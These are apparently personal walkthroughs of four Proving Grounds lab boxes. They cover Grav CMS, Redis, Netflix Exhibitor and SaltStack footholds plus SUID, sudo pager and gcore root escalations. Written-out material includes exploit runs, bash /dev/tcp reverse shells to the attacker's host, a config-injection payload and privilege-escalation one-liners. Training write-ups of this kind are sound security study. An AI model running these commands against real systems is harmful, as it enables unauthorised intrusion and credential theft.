Astronaut (Proving Grounds Practice · Linux · Intermediate)#

  • IP: 192.168.190.12 (host: gravity) Date: 2026-10-19
  • One-line: Grav CMS unauthenticated RCE (CVE-2021-21425, scheduler YAML write) → www-data → **SUID /usr/bin/php7.4** → root in one GTFOBins command.

1. Enumeration#

nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP       # 22, 80
nmap -p22,80 -sCV -Pn -oN scans/services.txt $IP
whatweb http://$IP                                            # Apache 2.4.41 (Ubuntu)

Port 80 served HTML. View-source gave it away:

/grav-admin/                          ← Grav's app path
/grav-admin/user/themes/quark/js/...  ← "user/themes" + "quark" theme = Grav CMS

whatweb http://$IP/grav-admin/ → MetaGenerator[GravCMS]. Grav CMS confirmed.

🔑 Recognition: the *paths in the page source* name the product (user/themes, quark = Grav). Same method as Subrion — read the source/headers/title.

2. Foothold (www-data)#

Vector: Grav Admin plugin ≤ 1.10.7 — unauthenticated RCE (CVE-2021-21425). Grabs the admin-nonce from /grav-admin/admin (unauth), POSTs a malicious scheduler job that runs PHP → reverse shell.

searchsploit grav
# pick: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) | 49876/49973.py
#   (unauthenticated ✅ + runnable .py ✅ + RCE ✅ ; the .rb is Metasploit — skip)
searchsploit -m 49973 ; searchsploit -x 49973      # READ it first

Two ways this PoC exists — check how it takes input:

  • argparse version: python3 49973.py -u http://192.168.190.12/grav-admin/ ← this is what worked
  • hardcoded version: edit target= + the base64 reverse-shell blob inside, then python3 49973.py
# Kali: nc -lvnp 443
python3 49973.py -u http://192.168.190.12/grav-admin/     # → www-data shell on nc
python3 -c 'import pty;pty.spawn("/bin/bash")'            # stabilize (Ctrl+Z → stty raw -echo; fg → export TERM=xterm) NO Ctrl+C

3. Privilege Escalation (root)#

Dead-ends first (methodical elimination):

  • sudo -l → asks for www-data's password (it has none) → skip (don't guess).
  • getcap -r / → only standard caps → nothing.
  • /etc/crontab → all stock run-parts → no custom root job.
  • /usr/bin/pkexec → **-rwxr-xr-x (NOT SUID), dated Feb 2022 = patched → PwnKit out.**
  • Grav admin bcrypt hash (user/accounts/*.yaml, $2y$10$...) → crackable but only 32 H/s on CPU → too slow to rely on.

The real path — SUID php:

find / -perm -4000 -type f 2>/dev/null
#   ... /usr/bin/php7.4   ← the odd one out (a code-running binary, SUID root)
ls -l /usr/bin/php7.4
#   -rwsr-xr-x  ← the 's' = SUID, owner root
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"      # GTFOBins (php → SUID) → root
id                                                         # euid=0(root) 🎉
cat /root/proof.txt

Why it works: SUID = the binary runs as its owner (root). php runs arbitrary code → pcntl_exec('/bin/sh',['-p']) spawns a root shell. The **-p** is essential: it stops the shell dropping euid→ruid (without it you'd fall back to www-data).

  • proof.txt: [captured]

4. Learnings & tips#

  • Recognition by source paths. user/themes/quark → Grav. The product name leaks in source/headers/title — read them.
  • Read + adapt exploits. Public PoCs have hardcoded IPs/targets AND differ in how they take input — **--help / read the top** to see argparse (-u) vs an editable target= variable. Feed it the way it expects.
  • SUID on a code-running binary = instant root. php/python/perl/bash/etc. → GTFOBins → one line. The **-p** flag keeps euid=0.
  • **find -perm -4000 IS the SUID filter** — the list = all SUID files; ls -l to see the s bit.

5. Rabbit holes / mistakes (so I don't repeat them)#

  • ⚠️ Guessed www-data's sudo password (admin) — www-data has none; don't waste attempts on sudo -l prompts.
  • ⚠️ Nearly sank hours into a slow bcrypt crack (32 H/s). The SUID list gave root in one command — *always run the fast checks (sudo/SUID/caps) in parallel with any slow crack; don't block on hashcat.*
  • ⚠️ pkexec looked tempting but was patched (not SUID) — check ls -l /usr/bin/pkexec before assuming PwnKit.
  • 💡 su needs a stabilized TTY; never Ctrl+C a raw shell.

Blackgate (Proving Grounds Practice · Linux · Intermediate)#

  • IP: <target> Date: 2026-10-20
  • One-line: Unauthenticated Redis 4.0.14 → module-load RCE (redis-rogue-server) → prudence → sudo on a custom redis-status ELF that runs **systemctl status as root → less pager escape** (!/bin/bash) → root.

1. Enumeration#

nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP      # only 22, 6379
nmap -p22,6379 -sCV -Pn -oN scans/services.txt $IP
PortServiceNote
22OpenSSHno creds yet → payoff, not a way in
6379Redis 4.0.14open, no auth → the only way in
🔑 Two ports, SSH useless without creds → Redis is the entire foothold. The version 4.0.14 is the tell: Redis ≥ 4.0 supports loading external modules → RCE. (See [ENUM-REDIS] / [VERSION-VULN-MAP].)

2. Foothold (prudence, uid=1001)#

Vector: Redis ≥ 4.0 module-load RCE. redis-rogue-server stands up a rogue master, makes the target replicate from it, and sideloads a malicious .so that adds system.exec / system.rev.

# redis-rogue-server (github n0b0dyCN/redis-rogue-server)
python3 redis-rogue-server.py --rhost $IP --lhost <KALI>
#   ⚠️ it threw UnicodeDecodeError('gb18030') — a KNOWN cosmetic bug; the module LOADS anyway.
# So just drive it by hand with redis-cli:
redis-cli -h $IP
  MODULE LIST                 # confirm the evil 'system' module is loaded
  system.exec "id"            # → uid=1001(prudence)  = RCE
  system.rev <KALI> 443       # reverse shell (Kali: nc -lvnp 443)

Stabilise, then:

3. Privilege Escalation (root)#

The breadcrumb: a root-owned but world-readable notes.txt planted in prudence's home:

[?] Setup redis server
[?] Turn on protected mode
[?] Implementation of the redis-status      ← points straight at the privesc
[?] Allow remote connections to the redis server

The sudo right:

sudo -l
#   (root) NOPASSWD: /usr/local/bin/redis-status

Cracking the binary:

ls -l /usr/local/bin/redis-status     # -rwxr-xr-x root root → can't edit it
file /usr/local/bin/redis-status      # ELF 64-bit, dynamically linked, NOT STRIPPED
sudo /usr/local/bin/redis-status      # prompts "Authorization Key:" → wrong key = "Incident reported!"
strings /usr/local/bin/redis-status   # not stripped → read its guts:
#   ClimbingParrotKickingDonkey321          ← hardcoded auth key
#   /usr/bin/systemctl status redis         ← runs this as root via system()

Logic reconstructed: prompt → gets() key → strcmp() vs the hardcoded key → if match, system("/usr/bin/systemctl status redis").

**The exploit — systemctl status → pager escape (GTFOBins):**

systemctl is called by full path → no PATH hijack. BUT systemctl status in a TTY pipes through the **less pager, which here runs as root**, and less can spawn a shell with !. less auto-quits if output fits one screen → shrink the terminal to keep it open.

stty rows 5                                  # force systemctl output to overflow → pager stays open
sudo /usr/local/bin/redis-status
#   Authorization Key:  ClimbingParrotKickingDonkey321
#   → drops into less (as root) → type:
!/bin/bash                                   # root shell
id                                           # uid=0(root) 🏆
cat /root/proof.txt
  • proof.txt: [captured]

4. Learnings & tips#

  • A version number is a lead, not trivia. "Redis 4.0.14" → module-load RCE + the tool name redis-rogue-server. This is the exact gap [VERSION-VULN-MAP] fills.
  • A root-owned, world-readable file in your home is a planted hint — read it first. notes.txt named the privesc outright.
  • **sudo a custom binary → ask "what does it run as root, and can I subvert that?"** Not stripped → strings leaks the auth key AND the command it runs.
  • **systemctl status = GTFOBins pager escape.** Any root process that pages through less/more → !sh. Shrink the terminal (stty rows 5) so the pager doesn't auto-quit.
  • "Tool threw an error" ≠ "tool failed." redis-rogue-server's UnicodeDecodeError is cosmetic — the module loaded; verify with MODULE LIST before giving up.

5. Rabbit holes / mistakes (so I don't repeat them)#

  • ⚠️ cat'd a binary → garbage. Compiled ELF → use strings / file, not cat.
  • ⚠️ First strings run got typed INTO the program's Authorization Key: prompt (it was still waiting on input) → "Wrong key". Run strings at the shell prompt, not while the binary is reading stdin.
  • ⚠️ Nearly reached for a PATH hijack — defeated here by the full path to systemctl + secure_path in sudo Defaults. Read the binary first; it showed the full path.
  • 💡 The SUID list was all stock snap/system binaries (pkexec present = possible PwnKit backup, but unneeded). The sudo -l entry was the intended path.
  • 💡 Binary also uses gets() → a real buffer-overflow bug (a second path in). Pager escape is cleaner, so took it.

Pelican (Proving Grounds Practice · Linux · Intermediate)#

  • IP: 192.168.123.98 Date: 2026-10-12
  • One-line: Netflix Exhibitor web UI (java.env config-injection) → RCE as *charles* → sudo gcore to dump the memory of a root process literally named **password-store** → read the root password out of memory → su root.

1. Enumeration#

nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
nmap -p22,139,445,631,2181,2222,8080,8081,34051 -sCV -Pn -oN scans/services.txt $IP
PortServiceNote
22 / 2222OpenSSH 7.9two SSH ports (same host key)
139/445Samba 4.9.5guest; nothing useful here
631CUPS 2.2🐇 distraction
2181Apache ZooKeeper 3.4.6managed by Exhibitor
8080Jetty → **/exhibitor/v1/ui/index.html**🎯 Netflix Exhibitor
8081nginxjust redirects to the Exhibitor UI on 8080
34051Java RMInot needed

🔑 How I identified the foothold: the 8081→8080 redirect pointed at **/exhibitor/v1/ui/. The word exhibitor** in the path is a *product name*, not a generic route — and ZooKeeper sits right next to it on 2181. Googling "exhibitor zookeeper" → Netflix Exhibitor (a ZK supervisor with a web config UI). Then "exhibitor RCE" → the java.env config-injection. *Method, not memory: unfamiliar string in output → Google it → that's the product → search its exploits.*

2. Foothold (user = charles)#

Vector: Netflix Exhibitor lets you edit a **java.env script in its Config tab. Exhibitor writes that to a file that ZooKeeper sources (executes)** on restart → arbitrary command execution as the user running Exhibitor (*charles*).

Steps:

# 1) Kali listener:
nc -lvnp 443
# 2) Exhibitor UI → http://192.168.123.98:8080/exhibitor/v1/ui/index.html → Config tab → toggle Editing on
#    put this in the java.env field:
$(/bin/bash -i >& /dev/tcp/<KALI-IP>/443 0>&1)
# 3) Commit the config, then Restart ZooKeeper from the Exhibitor controls → java.env runs → shell lands

Landed as **charles** (uid=1000) in /opt/zookeeper.

  • local.txt: [captured]

Stabilise immediately (learned the hard way — see rabbit holes):

python3 -c 'import pty;pty.spawn("/bin/bash")'   # Ctrl+Z → stty raw -echo; fg → Enter → export TERM=xterm

3. Privilege Escalation (root)#

Dead-end first (and that's fine): getcap -r / showed only cap_net_raw (ping), cap_ipc_lock (keyring), cap_net_bind/admin (gstreamer) — none exploitable. No cap_setuid on a code-running binary. *Lesson: don't force a technique; empty vector → next one.*

**The real path — sudo gcore:**

sudo -l
#   (ALL) NOPASSWD: /usr/bin/gcore      ← charles can run gcore as ROOT

Why this = root: gcore dumps the memory of a running process to a file. With sudo, you can dump any process — including root-owned ones — and process memory is full of secrets. So: find a privileged process holding a credential → dump it → strings the dump → read the secret.

ps aux
#   root  494  /usr/bin/password-store   ← a root process LITERALLY named "password-store"
sudo /usr/bin/gcore -o /tmp/dump 494                        # dump its memory (as root)
strings /tmp/dump.494 | grep -i -A5 -B2 'Password'          # → "Password: root:" + the value next to it

That revealed the root password. Then:

su root        # paste the recovered password  (needs a STABLE shell — see rabbit holes)
id             # uid=0(root) 🎉
cat /root/proof.txt
  • proof.txt: [captured]

4. Learnings & tips#

  • Recognition by product name. /exhibitor/ in a URL = the product Exhibitor. Unfamiliar string → Google it → find its exploit. You don't need to know every app.
  • "What does this tool DO as root?" When sudo -l gives an *odd* binary, reason about its capability. gcore dumps memory → memory holds secrets → dump a secret-holding root process → read the credential. This mindset cracks weird privescs that aren't on GTFOBins.
  • **ps aux names are clues.** A process called password-store is a giant arrow. Read process lists for intent.
  • Don't force a technique. Capabilities looked promising but were a dead end — pivoting to sudo -l found the real path in seconds.

5. Rabbit holes / mistakes (so I don't repeat them)#

  • ⚠️ Ctrl+C killed my reverse shell. In an unstabilised shell there's no job control, so Ctrl+C drops the whole connection. After that, commands I typed ran on Kali by mistake (gcore: command not found, No such file). → **Always stabilise (python pty + stty raw -echo) before doing anything, and never Ctrl+C a raw shell.**
  • ⚠️ **su needs a real TTY.** In a dumb shell the password prompt misbehaves → stabilise first, *then* su root.
  • ⚠️ SSH-key route hit a booby-trapped login. Planting my key worked (auth succeeded), but charles's login ran a bogus foo command and the server denied a PTY (PTY allocation request failed) → session died. Bypass = ssh -i key charles@IP -tt "bash --noprofile --norc". In the end, restarting the lab + re-running the Exhibitor reverse shell (then stabilising) was the clean way back in.
  • 🐇 Ignore CUPS (631), Java RMI (34051), Samba — all distractions on this box.

Twiggy (Proving Grounds Practice · Linux · Easy)#

  • IP: 192.168.134.62 Date: 2026-10-08 Time to root: fast (recognition → PoC)
  • One-line: Spotted SaltStack by its 4505/4506 ZeroMQ ports → unauth RCE (CVE-2020-11651) → salt-master runs as root → read the flag directly.

1. Enumeration#

All-ports scan:

nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
# open: 22, 53, 80, 4505, 4506, 8000
nmap -p22,53,80,4505,4506,8000 -sCV -Pn -oN scans/services.txt $IP

What each port was:

PortServiceNote
22OpenSSH 7.4payoff only
53NSD (DNS)not the path
80nginx 1.16.1 — Mezzanine CMS🐇 distraction
4505 / 4506ZeroMQ ZMTP 2.0🎯 SaltStack salt-master
8000nginx, returns JSONsalt-api (2nd door to the same bug)

🔑 The tell: 4505 + 4506 open together = SaltStack. That pair is a dead giveaway — jump straight to it, ignore the CMS.

2. Foothold = Root (salt-master runs as root)#

There was no separate user→root step: the salt-master process runs as root, so unauth RCE on it *is* root.

Vector: CVE-2020-11651 (auth bypass) + CVE-2020-11652 (path traversal) → unauthenticated RCE. Vulnerable on Salt < 2019.2.4 / < 3000.2.

Steps + commands:

# get + read the PoC
git clone https://github.com/jasperla/CVE-2020-11651-poc && cd CVE-2020-11651-poc
# it needs the salt python lib (Kali dropped salt-common from apt → use pip):
pip3 install salt msgpack --break-system-packages

export IP=192.168.134.62

# confirm vulnerable + prove exec (blind):
python3 exploit.py --master $IP --exec "id"
#   → "Checking if vulnerable to CVE-2020-11651... YES"
#   → "root key obtained: ..."
#   → "Successfully scheduled job" (ran, but --exec shows NO output = blind)

# read the flag directly as root (the winning move):
python3 exploit.py --master $IP --read /root/proof.txt      # → proof.txt 🏁
  • proof.txt: [captured]

For a full interactive root shell (optional):

# Kali: nc -lvnp 443
python3 exploit.py --master $IP --exec "bash -c 'bash -i >& /dev/tcp/<KALI-IP>/443 0>&1'"
# then: find / -name local.txt 2>/dev/null ; cat /root/proof.txt

3. Learnings & tips#

  • Port recognition wins boxes. 4505/4506 (ZeroMQ) → SaltStack, instantly. Memorise service-by-port tells.
  • Ask "what user does the service run as?" salt-master = root, so the exploit IS the privesc. No local enum needed.
  • Blind RCE → route output to yourself. --exec "id" ran but printed nothing (blind). Don't fight it — use the file-read primitive (--read) or fire a reverse shell.
  • Kali deps on modern Kali: apt no longer has salt-common; use pip3 install salt msgpack --break-system-packages (or a venv).

4. Rabbit holes / mistakes#

  • ⚠️ Mezzanine CMS on :80 is a distraction — don't enumerate it; the Salt port is the obvious, faster path.
  • ⚠️ **Shell variable $IP not set in the new tab** → --master $IP gave "expected one argument". Variables are per-tab; export IP=... in each tab.
  • ⚠️ Reverse-shell IP = the TARGET by mistake (/dev/tcp/192.168.134.62/...). It must be your Kali tun0 IP. Target = where you attack; Kali = where the shell comes home.
